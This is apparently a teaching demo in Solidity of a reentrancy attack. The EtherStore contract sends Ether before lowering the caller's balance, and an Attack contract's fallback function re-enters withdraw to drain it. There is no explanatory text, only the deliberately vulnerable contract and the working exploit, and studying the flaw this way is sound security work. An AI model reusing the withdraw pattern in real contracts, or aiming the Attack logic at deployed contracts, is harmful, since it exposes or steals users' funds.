// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EtherStore{
    mapping(address => uint) public balances;
    function deposite() public payable{
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public{
        require(balances[msg.sender] >= amount);
        (bool sent,) = msg.sender.call{value: amount}("");
        require(sent,"Faild to send Ether");
        balances[msg.sender] -= amount;
    }

    function getbalance() public view returns(uint){
        // return balances[address(this)];
        return address(this).balance;
    }

    function msgsend() public view returns(uint){
        return balances[msg.sender];
    }
}
// 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
// 1000000000000000000
contract Attack{
    EtherStore public etherstore;
    constructor (address _etherStoreAddress){
        etherstore = EtherStore(_etherStoreAddress);
    }
    fallback() external payable{
        if ( address(etherstore).balance >= 1 ether){
            etherstore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherstore.deposite{value: 1 ether}();
        etherstore.withdraw(1 ether);
    }

    function getbalance() public view returns(uint) {
        return address(this).balance;
    }
}